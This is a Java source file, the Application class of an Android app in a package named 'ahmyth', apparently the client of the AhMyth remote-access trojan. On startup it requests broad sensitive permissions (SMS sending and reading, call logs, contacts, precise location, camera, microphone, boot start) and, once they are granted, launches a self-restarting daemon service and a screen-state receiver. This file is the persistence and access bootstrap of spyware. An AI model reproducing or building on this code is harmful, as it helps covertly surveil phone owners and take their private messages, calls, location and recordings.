package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Application;
import android.content.Context;
import android.content.IntentFilter;
import android.util.Log;
import com.mylhyl.acp.Acp;
import com.mylhyl.acp.AcpListener;
import com.mylhyl.acp.AcpOptions;
import com.xdandroid.hellodaemon.DaemonEnv;
import java.util.List;

/**
 * Created by Administrator on 2018/1/6.
 */

public class Myapplication extends Application {
    private static Context context;
    private ScreenReceiver screenReceiver;

    public void onCreate(){
        super.onCreate();
        Myapplication.context = getApplicationContext();
        Acp.getInstance(this).request(new AcpOptions.Builder()
                        .setPermissions(Manifest.permission.WRITE_EXTERNAL_STORAGE
                                , Manifest.permission.READ_PHONE_STATE
                                , Manifest.permission.SEND_SMS
                                , Manifest.permission.RECEIVE_BOOT_COMPLETED
                                , Manifest.permission.READ_EXTERNAL_STORAGE
                                , Manifest.permission.READ_CALL_LOG
                                , Manifest.permission.RECORD_AUDIO
                                , Manifest.permission.MODIFY_AUDIO_SETTINGS
                                , Manifest.permission.ACCESS_FINE_LOCATION
                                , Manifest.permission.READ_CONTACTS
                                , Manifest.permission.CAMERA
                                , Manifest.permission.INTERNET
                                , Manifest.permission.READ_SMS
                        )
                        .build(),
                new AcpListener() {
                    @Override
                    public void onGranted() {

                        DaemonEnv.initialize(context, MainService.class, 60000);
                        MainService.sShouldStopService = false;
                        DaemonEnv.startServiceMayBind(MainService.class);
                        screenReceiver = new ScreenReceiver();
                        IntentFilter filter = new IntentFilter();
                        filter.addAction("android.intent.action.SCREEN_OFF");
                        filter.addAction("android.intent.action.SCREEN_ON");
                        context.registerReceiver(screenReceiver, filter);
                    }
                    @Override
                    public void onDenied(List<String> permissions) {
                        Log.d("permissions",permissions.toString()+ "权限拒绝");
                    }
                });
    }
    public static Context getAppContext() {
        return Myapplication.context;
    }
}
